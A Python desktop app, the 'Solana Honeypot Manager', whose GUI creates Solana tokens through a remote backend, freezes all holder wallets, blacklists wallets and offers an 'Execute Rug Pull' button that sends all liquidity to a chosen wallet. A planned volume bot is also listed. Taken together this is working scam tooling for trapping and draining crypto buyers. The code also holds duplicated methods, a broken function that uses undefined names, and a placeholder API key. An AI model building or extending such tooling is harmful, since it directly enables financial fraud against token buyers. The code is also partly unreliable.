import requests
import solana
import tkinter as tk
import threading
from tkinter import ttk, messagebox, Canvas, Button, Frame
from solders.keypair import Keypair
from solders.pubkey import Pubkey
from solana.rpc.api import Client
from solana.transaction import Transaction
from spl.token.constants import TOKEN_PROGRAM_ID
from spl.token.instructions import (
    initialize_mint,
    create_associated_token_account,
    mint_to_checked,
    freeze_account,
    thaw_account,
    transfer_checked,
)
from solders.pubkey import Pubkey
from solders.system_program import CreateAccountParams
from solders.instruction import Instruction
from solana.transaction import AccountMeta
from spl.token.instructions import InitializeMintParams  # Ensure correct imports
from solders.transaction import VersionedTransaction
from security_manager import TokenSecurityManager
#from solana.transaction import TransactionInstruction



class SolanaHoneypotManager:
    def fetch_ip_info(self):
        """Fetch the current IP and location."""
        try:
            import requests
            response = requests.get("https://ipinfo.io")
            data = response.json()
            ip = data.get("ip", "Unknown")
            city = data.get("city", "Unknown City")
            region = data.get("region", "Unknown Region")
            return f"IP: {ip} | Location: {city}, {region}"#
        except Exception:
            return "IP and Location Unavailable"

    def __init__(self, root):
        self.root = root
        self.root.title("Solana Honeypot Manager")
        self.root.geometry("900x900")

        # Initialize the Token Security Manager
        self.security_manager = TokenSecurityManager()

        # Initialize Solana RPC client and state variables
        self.network = tk.StringVar(value="https://api.devnet.solana.com")
        self.client = Client(self.network.get())
        self.payer = Keypair()  # This wallet must be funded
        self.mint_account = None
        self.whitelisted_wallets = set()
        self.blacklisted_wallets = set()
        self.current_wallet_address = None
        self.current_token_address = None

        #Style the Hard Reset Button
        style = ttk.Style()
        style.configure("Danger.TButton", foreground="red", background="white")

         
        #New code
        self.top_bar_frame = tk.Frame(self.root, bg="white")
        self.top_bar_frame.pack(side="top", fill="x", pady=5)


        # Main UI Setup
        self.setup_ui()

        # Ensure no wallet is connected initially
        self.check_wallet_status()

        # Create a frame for bottom-right elements
        self.bottom_right_frame = Frame(root)
        self.bottom_right_frame.pack(side="bottom", anchor="e", pady=10, padx=10)

        # Add status dot
        self.status_canvas = Canvas(self.bottom_right_frame, width=15, height=15)
        self.status_canvas.create_oval(3, 3, 12, 12, fill="red", outline="black", tags="status_dot")
        self.status_canvas.pack(side="left", padx=5)

        # Add refresh button
        self.refresh_button = Button(self.bottom_right_frame, text="Refresh Status", command=self.check_server_status)
        self.refresh_button.pack(side="left", padx=5)

        # Check server status at startup
        self.check_server_status()

        # Optional: Periodic server status monitoring
        self.start_status_monitor()

    def shorten_address(self, address):
        """Shorten the wallet address for display."""
        if not address:
            return "No Wallet Connected"
        return f"{address[:4]}...{address[-2:]}"


    def copy_to_clipboard(self, event):
        """Copy wallet address to clipboard and show a temporary 'Copied!' message."""
        self.root.clipboard_clear()
        self.root.clipboard_append(self.current_wallet_address)
        self.root.update()

        # Show a temporary 'Copied!' message
        if hasattr(self, "copied_label"):
            self.copied_label.destroy()  # Remove existing label to avoid duplication
        self.copied_label = ttk.Label(self.top_bar_frame, text="Copied!", foreground="green", background="white")
        self.copied_label.pack(side="left", padx=5)
        self.copied_label.after(2000, self.copied_label.destroy)  # Remove after 2 seconds


    def setup_ui(self):
        # Configure the root window grid layout
        self.root.grid_rowconfigure(1, weight=1)  # Row for tabs
        self.root.grid_columnconfigure(0, weight=1)

         # Create a frame for the top bar
        top_bar_frame = tk.Frame(self.root, bg="#D3D3D3")  # Use a darker background color for the top bar
        top_bar_frame.pack(side="top", fill="x", pady=5)

        # Network Label
        network_label = tk.Label(top_bar_frame, text="Network:", font=("Arial", 10), bg="#D3D3D3")
        network_label.pack(side="left", padx=10)

        # Network Combo Box
        self.network_combo = ttk.Combobox(
            top_bar_frame,
            values=["Devnet", "Mainnet"],
            state="readonly",
            width=10
        )
        self.network_combo.pack(side="left", padx=5)
        self.network_combo.set("Devnet")  # Default network

        # Wallet Address Label (on the left, shortened and grey)
        self.wallet_label = tk.Label(
            top_bar_frame,
            text=self.shorten_address(self.current_wallet_address),
            cursor="hand2",
            fg="blue",  # Set to grey
            font=("Arial", 10),
            bg="#D3D3D3"
        )
        
        self.connect_wallet_button = ttk.Button(
            top_bar_frame, text="Connect Wallet", command=self.connect_or_disconnect_wallet
        )
        self.connect_wallet_button.pack(side="right", padx=10)
        #self.wallet_button.pack(side="right", padx=10)

        
        #, pady=5, anchor="w" for below
        self.wallet_label.pack(side="left", padx=15)
        self.wallet_label.bind("<Button-1>", self.copy_to_clipboard)

        # Ensure other elements (e.g., network combo box, reload button) are packed in a non-overlapping order.
        #self.network_label.pack(side="left", padx=10)
        self.network_combo.pack(side="left", padx=5)
        
        self.ip_info_label = tk.Label(top_bar_frame, text=self.fetch_ip_info(), anchor="w", bg="#D3D3D3", font=("Arial", 10))
        self.ip_info_label.pack(side="left", padx=10)

        # Add tabs below the top bar
        self.tabs = ttk.Notebook(self.root)
        #self.tabs.grid(row=1, column=0, sticky="nsew", padx=10, pady=10)
        self.tabs.pack(expand=True, fill="both", padx=10, pady=10)

        # Create the notebook for all tabs

        # Create individual tabs
        self.honeypot_tab = ttk.Frame(self.tabs)
        self.wallet_management_tab = ttk.Frame(self.tabs)
        self.volume_bot_tab = ttk.Frame(self.tabs)
        self.token_info_tab = ttk.Frame(self.tabs)

        # Add tabs to the notebook
        self.tabs.add(self.honeypot_tab, text="Honeypot Manager")
        self.tabs.add(self.wallet_management_tab, text="Wallet Management")
        self.tabs.add(self.volume_bot_tab, text="Volume Bot")
        self.tabs.add(self.token_info_tab, text="Token Info")

        # Add the notebook to the root window
        self.tabs.place(relx=0.5, rely=0.5, anchor="center", width=860, height=650)

        # Add content to the tabs
        self.create_honeypot_tab()
        self.create_wallet_tab()
        self.create_volume_bot_tab()
        self.create_token_info_tab()
        
        # Add "Reload IP" button to the top right
        self.reload_ip_button = ttk.Button(top_bar_frame, text="Reload IP", command=self.reload_ip)
        self.reload_ip_button.pack(side="right", padx=10)


        # Hard Reset button placed at the bottom right
        reset_button = ttk.Button(self.root, text="Hard Reset", command=self.hard_reset)
        reset_button.pack(side="bottom", padx=0, pady=10)

        self.root.after(5000, self.check_wallet_connection)  # Check every 5 seconds

    def connect_wallet(self):
        """Handle wallet connection."""
        self.manage_wallet("connect")

    def disconnect_wallet(self):
        """Handle wallet disconnection."""
        self.manage_wallet("disconnect")


    def connect_or_disconnect_wallet(self):
        if self.current_wallet_address:
            # Disconnect the wallet
            self.current_wallet_address = None
            self.wallet_label.config(text="No Wallet Connected")
            self.connect_wallet_button.config(text="Connect Wallet")
            messagebox.showinfo("Wallet Disconnected", "Wallet has been disconnected.")
        else:
            # Connect the wallet
            try:
                response = requests.get("https://winniethepooh.onrender.com/get_connected_wallet", timeout=5)
                if response.status_code == 200:
                    wallet_data = response.json()
                    self.current_wallet_address = wallet_data.get("wallet_address")

                    # Update the UI to show connected wallet
                    self.wallet_label.config(text=self.shorten_address(self.current_wallet_address))
                    self.connect_wallet_button.config(text="Disconnect Wallet")
                    messagebox.showinfo("Wallet Connected", f"Connected to wallet: {self.current_wallet_address}")

                    # Check for existing tokens (if relevant)
                    self.check_existing_token()
                else:
                    raise Exception("Failed to connect wallet.")
            except Exception as e:
                messagebox.showerror("Error", f"An error occurred: {e}")

    def check_wallet_status(self):
        """Check wallet connection status with the backend."""
        import threading

        def fetch_status():
            try:
                response = requests.get("https://winniethepooh.onrender.com/get_connected_wallet", timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    self.current_wallet_address = data["wallet_address"]
                    self.wallet_label.config(text=self.shorten_address(self.current_wallet_address))
                    self.connect_wallet_button.config(text="Disconnect Wallet")
                else:
                    self.current_wallet_address = None
                    self.wallet_label.config(text="No Wallet Connected")
                    self.connect_wallet_button.config(text="Connect Wallet")
            except Exception as e:
                self.current_wallet_address = None
                self.wallet_label.config(text="No Wallet Connected")
                self.connect_wallet_button.config(text="Connect Wallet")
                print(f"Error checking wallet status: {e}")

        # Run the status check in a background thread to avoid UI blocking
        threading.Thread(target=fetch_status, daemon=True).start()

    def update_status_dot(self, is_connected):
        """Update the status dot color."""
        color = "green" if is_connected else "red"
        self.status_canvas.itemconfig("status_dot", fill=color)


    def check_server_status(self):
        """Check server connection and update the status dot."""
        try:
            # Make a request to the health endpoint with a short timeout
            response = requests.get("https://winniethepooh.onrender.com/health", timeout=5)
            if response.status_code == 200 and response.json().get("status") == "ok":
                self.update_status_dot(is_connected=True)
            else:
                # If the response is not as expected, mark as disconnected
                self.update_status_dot(is_connected=False)
        except requests.exceptions.RequestException as e:
            # Handle any exceptions, such as timeout or connection error
            self.update_status_dot(is_connected=False)
            print(f"Server check failed: {e}")


    def check_existing_token(self):
        """Check if a token is associated with the connected wallet."""
        try:
            response = requests.get(f"https://winniethepooh.onrender.com/check_token/{self.current_wallet_address}", timeout=5)
            if response.status_code == 200:
                token_data = response.json()
                if token_data.get("token_exists"):
                    messagebox.showinfo("Token Found", f"Token associated with wallet: {token_data.get('token_address')}")
                else:
                    messagebox.showinfo("No Token", "No token is associated with this wallet.")
            else:
                raise Exception("Failed to retrieve token information.")
        except Exception as e:
            messagebox.showerror("Error", f"An error occurred while checking for tokens: {e}")


    def update_wallet_display(self, wallet_address):
        """Update the wallet button and address display."""
        if hasattr(self, "connect_wallet_button"):
            self.connect_wallet_button.destroy()  # Remove the existing button
        if wallet_address:
            self.connect_wallet_button = tk.Button(
                self.top_bar_frame,
                text=f"Disconnect ({self.shorten_address(wallet_address)})",
                command=self.disconnect_wallet,
                bg="lightblue",
                fg="black",
                font=("Arial", 10)
            )
        else:
            self.connect_wallet_button = tk.Button(
                self.top_bar_frame,
                text="Connect Wallet",
                command=self.connect_wallet,
                bg="lightgray",
                fg="black",
                font=("Arial", 10)
            )
        self.connect_wallet_button.pack(side="right", padx=10)

    def start_status_monitor(self):
        """Start periodic server status monitoring in a safe thread."""
        def monitor():
            while True:
                try:
                    self.check_server_status()
                except Exception as e:
                    print(f"Error in server status monitor: {e}")
                self.root.after(10000, lambda: None)  # Delay for 10 seconds
        threading.Thread(target=monitor, daemon=True).start()



    def manage_wallet(self, action):
        """Handle wallet connection or disconnection."""
        try:
            wallet_address = self.current_wallet_address if action == "disconnect" else None
            payload = {"action": action, "wallet_address": wallet_address}
            response = requests.post("https://winniethepooh.onrender.com/get_connected_wallet", json=payload)
            data = response.json()

            if response.status_code == 200:
                if action == "connect":
                    self.current_wallet_address = data["wallet_address"]
                    self.wallet_label.config(text=self.shorten_address(self.current_wallet_address))
                    self.connect_wallet_button.config(text="Disconnect Wallet")
                elif action == "disconnect":
                    self.current_wallet_address = None
                    self.wallet_label.config(text="No Wallet Connected")
                    self.connect_wallet_button.config(text="Connect Wallet")
                messagebox.showinfo("Success", data["message"])
            else:
                error_message = data.get("error", "Unknown error")
                print(f"Backend Error: {error_message}")
                messagebox.showerror("Error", error_message)
        except Exception as e:
            print(f"Connection Error: {e}")
            messagebox.showerror("Error", f"An error occurred: {e}")




    def connect_phantom_wallet(self):
        """Open a web interface for Phantom wallet connection."""
        import webbrowser
        try:
            # URL for the local web server to handle Phantom connection
            phantom_url = "https://winniethepooh.onrender.com/connect_phantom"
            webbrowser.open(phantom_url)

            # Wait for the connection to be established
            messagebox.showinfo("Phantom Wallet", "Please connect your wallet in the browser.")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to connect Phantom wallet: {e}")

    import requests

    def check_wallet_connection(self):
        try:
            response = requests.get("https://winniethepooh.onrender.com/get_connected_wallet", timeout=5)
            data = response.json()
            wallet_address = data.get("wallet_address")
            if wallet_address:
                self.current_wallet_address = wallet_address
                self.wallet_label.config(text=self.shorten_address(wallet_address))
                print(f"Wallet connected: {wallet_address}")
            else:
                print("No wallet connected yet.")
        except Exception as e:
            print(f"Failed to check wallet connection: {e}")


    def get_saved_wallet_address(self):
        """Fetch the connected wallet address from the backend server."""
        import requests
        try:
            response = requests.get("https://winniethepooh.onrender.com/get_connected_wallet", timeout=5)
            wallet_data = response.json()
            return wallet_data.get("walletAddress", "No Wallet Connected")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to fetch wallet address: {e}")
            return "No Wallet Connected"


    def reload_ip(self):
        """Reload and update the IP address and location display."""
        new_ip_info = self.fetch_ip_info()
        self.ip_info_label.config(text=new_ip_info)

    def update_network(self, event):
        """Update the Solana RPC client to the selected network."""
        self.client = Client(self.network_combo.get())
        network = "Devnet" if "devnet" in self.network_combo.get() else "Mainnet"
        self.wallet_label.config(
            text=f"Active Wallet ({network}): {self.current_wallet}"
        )
        messagebox.showinfo("Network Updated", f"Switched to {network}")

    def draw_honeycomb(self, canvas, width, height):
        """Draw a subtle honeycomb pattern on the canvas."""
        hex_width = 60
        hex_height = 52
        offset = hex_width // 2
        fill_color = "white"  # Background between hexagons
        outline_color = "#FFD700"  # Light yellow for the hexagons

        for y in range(0, height, int(hex_height * 1.5)):
            for x in range(0, width, hex_width):
                x_offset = offset if (y // int(hex_height * 1.5)) % 2 else 0
                points = [
                    x + x_offset, y,
                    x + hex_width / 2 + x_offset, y + hex_height / 2,
                    x + hex_width / 2 + x_offset, y + hex_height + hex_height / 2,
                    x + x_offset, y + hex_height + hex_height,
                    x - hex_width / 2 + x_offset, y + hex_height + hex_height / 2,
                    x - hex_width / 2 + x_offset, y + hex_height / 2,
                ]
                canvas.create_polygon(points, fill=fill_color, outline=outline_color, width=1)

    def update_network(self, event):
        """Update the RPC client to the selected network."""
        self.client = Client(self.network_combo.get())
        messagebox.showinfo("Network Updated", f"Switched to {self.network_combo.get()}")

    def create_honeypot_tab(self):
        """Build the Honeypot Manager tab."""
        frame = ttk.Frame(self.honeypot_tab, padding=10)
        frame.pack(fill="both", expand=True)

        # Token Creation
        ttk.Label(frame, text="Create Token").pack(anchor="w", pady=5)
        ttk.Label(frame, text="Token Name:").pack(anchor="w")
        self.token_name_entry = ttk.Entry(frame)
        self.token_name_entry.pack(anchor="w", fill="x")

        ttk.Label(frame, text="Token Symbol:").pack(anchor="w")
        self.token_symbol_entry = ttk.Entry(frame)
        self.token_symbol_entry.pack(anchor="w", fill="x")

        ttk.Label(frame, text="Total Supply:").pack(anchor="w")
        self.token_supply_entry = ttk.Entry(frame)
        self.token_supply_entry.pack(anchor="w", fill="x")

        ttk.Button(frame, text="Create Token", command=self.create_token).pack(anchor="w", pady=10)

        # Freezing and Thawing
        ttk.Button(frame, text="Freeze All Wallets", command=self.freeze_all).pack(anchor="w", pady=5)
        ttk.Button(frame, text="Thaw All Wallets", command=self.thaw_all).pack(anchor="w", pady=5)

        # Rug Pull
        ttk.Label(frame, text="Rug Pull Wallet:").pack(anchor="w", pady=5)
        self.rug_pull_entry = ttk.Entry(frame)
        self.rug_pull_entry.pack(anchor="w", fill="x")
        ttk.Button(frame, text="Execute Rug Pull", command=self.rug_pull).pack(anchor="w", pady=10)


    def create_wallet_tab(self):
        """Build the Wallet Management tab."""
        frame = ttk.Frame(self.wallet_management_tab, padding=10)
        frame.pack(fill="both", expand=True)

        # Whitelist
        ttk.Label(frame, text="Whitelist Wallet:").pack(anchor="w", pady=5)
        self.whitelist_entry = ttk.Entry(frame)
        self.whitelist_entry.pack(anchor="w", fill="x")
        ttk.Button(frame, text="Add to Whitelist", command=self.add_to_whitelist).pack(anchor="w", pady=5)

        # Blacklist
        ttk.Label(frame, text="Blacklist Wallet:").pack(anchor="w", pady=5)
        self.blacklist_entry = ttk.Entry(frame)
        self.blacklist_entry.pack(anchor="w", fill="x")
        ttk.Button(frame, text="Add to Blacklist", command=self.add_to_blacklist).pack(anchor="w", pady=5)
    
    from solana.transaction import Transaction  # Add this import if not present

    from solders.system_program import CreateAccountParams
    from solana.rpc.types import TxOpts

    def create_token(self):
        """Create a new token on the Solana blockchain."""
        name = self.token_name_entry.get()
        symbol = self.token_symbol_entry.get()
        supply = self.token_supply_entry.get()

        if not name or not symbol or not supply:
            messagebox.showerror("Error", "All fields are required!")
            return

        try:
            response = requests.post(
                "https://winniethepooh.onrender.com/create_token",
                json={"name": name, "symbol": symbol, "supply": int(supply)},
            )
            data = response.json()

            if response.status_code == 200:
                messagebox.showinfo("Success", f"Token created! Mint Address: {data['mint_address']}")
            else:
                raise Exception(data.get("error", "Unknown error"))
        except Exception as e:
            messagebox.showerror("Error", f"Failed to create token: {e}")



    def transfer_token(self, sender_wallet, recipient_wallet, amount):
        if not self.security_manager.is_transfer_allowed(sender_wallet, recipient_wallet):
            messagebox.showerror("Error", "Transfer blocked by security settings.")
            return

        # Logic to execute the transfer
        transaction = Transaction()
        transaction.add(
            transfer_checked(
                TOKEN_PROGRAM_ID,
                Pubkey(sender_wallet),
                Pubkey(recipient_wallet),
                Pubkey(self.mint_account.pubkey()),
                self.payer.pubkey(),
                self.payer.pubkey(),
                amount,
                9  # Example decimals
            )
        )
        response = self.client.send_transaction(transaction, self.payer)
        messagebox.showinfo("Success", f"Transfer of {amount} tokens successful! Transaction ID: {response}")

    def create_devnet_wallet(self):
        """Create and fund a Devnet wallet for testing."""
        try:
            self.test_wallet = Keypair()
            messagebox.showinfo("Devnet Wallet", f"Wallet Public Key: {self.test_wallet.pubkey()}")

            # Fund the wallet using a faucet
            import requests
            response = requests.post(
                "https://devnet.solana.com", 
                json={"method": "requestAirdrop", "params": [str(self.test_wallet.pubkey()), 1000000000], "id": 1}
            )
            if response.status_code == 200:
                messagebox.showinfo("Devnet Wallet", "Devnet wallet funded with 1 SOL!")
            else:
                messagebox.showwarning("Devnet Wallet", "Failed to fund wallet via faucet.")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to create or fund Devnet wallet: {e}")


    def freeze_all(self):
        """Freeze all wallets."""
        headers = {"X-API-Key": "secure_api_key"}  # Replace with your actual API key

        try:
            response = requests.post("https://winniethepooh.onrender.com/freeze_all", headers=headers)
            if response.status_code == 200:
                messagebox.showinfo("Success", "All wallets frozen.")
            else:
                raise Exception(response.json().get("error", "Unknown error"))
        except Exception as e:
            messagebox.showerror("Error", f"Failed to freeze wallets: {e}")



    def thaw_all(self):
        """Thaw all frozen wallets."""
        if not self.mint_account:
            messagebox.showerror("Error", "No token created!")
            return

        try:
            for wallet in self.blacklisted_wallets:
                transaction = Transaction()
                transaction.add(
                    thaw_account(
                        TOKEN_PROGRAM_ID,
                        self.mint_account.pubkey(),
                        Pubkey(wallet),
                        self.payer.pubkey(),
                    )
                )
                self.client.send_transaction(transaction, self.payer)
            messagebox.showinfo("Success", "Blacklisted wallets thawed!")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to thaw accounts: {e}")

    def rug_pull(self):
        """Transfer all liquidity to a specified wallet."""
        destination_wallet = self.rug_pull_entry.get()
        if not destination_wallet:
            messagebox.showerror("Error", "Please enter a wallet address!")
            return

        headers = {"X-API-Key": "secure_api_key"}  # Replace with your actual API key

        try:
            response = requests.post(
                "https://winniethepooh.onrender.com/rug_pull",
                json={"destination_wallet": destination_wallet},
                headers=headers
            )
            if response.status_code == 200:
                messagebox.showinfo("Success", "Liquidity transferred!")
            else:
                raise Exception(response.json().get("error", "Unknown error"))
        except Exception as e:
            messagebox.showerror("Error", f"Rug pull failed: {e}")


    def add_to_whitelist(self):
        """Add a wallet to the whitelist."""
        wallet_address = self.whitelist_entry.get()
        if wallet_address:
            headers = {"X-API-Key": "secure_api_key"}  # Replace with your actual API key
            response = requests.post(
                "https://winniethepooh.onrender.com/whitelist",
                json={"action": "add", "wallet_address": wallet_address},
                headers=headers
            )
            if response.status_code == 200:
                self.security_manager.add_to_whitelist(wallet_address)
                self.whitelist_entry.delete(0, tk.END)  # Clear the entry box
                messagebox.showinfo("Success", f"Wallet {wallet_address} added to whitelist!")
            else:
                messagebox.showerror("Error", f"Failed to whitelist wallet: {response.json().get('error')}")
        else:
            messagebox.showerror("Error", "Please enter a wallet address!")

    def add_to_blacklist(self):
        """Add a wallet to the blacklist."""
        wallet_address = self.blacklist_entry.get()
        if wallet_address:
            headers = {"X-API-Key": "secure_api_key"}  # Replace with your actual API key
            response = requests.post(
                "https://winniethepooh.onrender.com/whitelist",
                json={"action": "remove", "wallet_address": wallet_address},
                headers=headers
            )
            if response.status_code == 200:
                self.security_manager.add_to_blacklist(wallet_address)
                self.blacklist_entry.delete(0, tk.END)  # Clear the entry box
                messagebox.showinfo("Success", f"Wallet {wallet_address} added to blacklist!")
            else:
                messagebox.showerror("Error", f"Failed to blacklist wallet: {response.json().get('error')}")
        else:
            messagebox.showerror("Error", "Please enter a wallet address!")

    # Hard Reset Button
    def hard_reset(self):
        """Reset the entire application to its initial state."""
        def confirm_delete():
            """Confirmation step for the hard reset."""
            # Clear all program state
            self.mint_account = None
            self.whitelisted_wallets.clear()
            self.blacklisted_wallets.clear()

            # Destroy existing UI and reinitialize
            for widget in self.root.winfo_children():
                widget.destroy()

            # Reinitialize the program
            self.__init__(self.root)

        # Show confirmation dialog
        if messagebox.askyesno("Confirm Reset", "Are you sure you want to reset the program? This will clear all data."):
            confirm_delete()

    # Function to refresh token info
    def refresh_token_info():
        token_address_label.config(text=f"Token Address: {token_address}")
        whitelisted_wallets_label.config(text=f"Whitelisted Wallets: {', '.join(whitelisted_wallets)}")
        blacklisted_wallets_label.config(text=f"Blacklisted Wallets: {', '.join(blacklisted_wallets)}")

        # Token Info Tab
        token_address_label = tk.Label(token_info_tab, text=f"Token Address: {token_address}")
        token_address_label.pack(pady=5)

        whitelisted_wallets_label = tk.Label(token_info_tab, text="Whitelisted Wallets: None")
        whitelisted_wallets_label.pack(pady=5)

        blacklisted_wallets_label = tk.Label(token_info_tab, text="Blacklisted Wallets: None")
        blacklisted_wallets_label.pack(pady=5)

        refresh_button = tk.Button(token_info_tab, text="Refresh", command=refresh_token_info)
        refresh_button.pack(pady=10)

    # Function to fetch IP and location
    def setup_ip_info(self):
        """Fetch and display IP and location information."""
        def fetch_ip_info():
            try:
                import requests
                response = requests.get("https://ipinfo.io")
                data = response.json()
                ip = data.get("ip", "Unknown")
                location = f"{data.get('city', 'Unknown City')}, {data.get('region', 'Unknown Region')}"
                return f"IP: {ip} | Location: {location}"
            except Exception:
                return "IP and Location Unavailable"

        ip_info_label = tk.Label(self.root, text=fetch_ip_info(), anchor="e")
        ip_info_label.pack(side=tk.TOP, anchor="ne", padx=10, pady=5)

    def create_token_info_tab(self):
        """Build the Token Info tab."""
        frame = ttk.Frame(self.token_info_tab, padding=10)
        frame.pack(fill="both", expand=True)

        # Token Address
        token_address_label = tk.Label(frame, text="Token Address: Not yet created")
        token_address_label.pack(pady=5)

        # Whitelisted Wallets
        self.whitelisted_wallets_label = tk.Label(frame, text="Whitelisted Wallets: None")
        self.whitelisted_wallets_label.pack(pady=5)

        # Blacklisted Wallets
        self.blacklisted_wallets_label = tk.Label(frame, text="Blacklisted Wallets: None")
        self.blacklisted_wallets_label.pack(pady=5)

        # Refresh Button
        refresh_button = tk.Button(frame, text="Refresh", command=self.refresh_token_info)
        refresh_button.pack(pady=10)

    def refresh_token_info(self):
        """Refresh token information on the Token Info tab."""
        token_address = str(self.mint_account.pubkey()) if self.mint_account else "Not yet created"
        self.whitelisted_wallets_label.config(
            text=f"Whitelisted Wallets: {', '.join(self.whitelisted_wallets) if self.whitelisted_wallets else 'None'}"
        )
        self.blacklisted_wallets_label.config(
            text=f"Blacklisted Wallets: {', '.join(self.blacklisted_wallets) if self.blacklisted_wallets else 'None'}"
        )

    def create_volume_bot_tab(self):
        """Build the Volume Bot tab."""
        frame = ttk.Frame(self.volume_bot_tab, padding=10)
        frame.pack(fill="both", expand=True)

        ttk.Label(frame, text="Volume Bot Features Coming Soon").pack(pady=20)





# Run the application
if __name__ == "__main__":
    root = tk.Tk()
    app = SolanaHoneypotManager(root)
    root.mainloop()
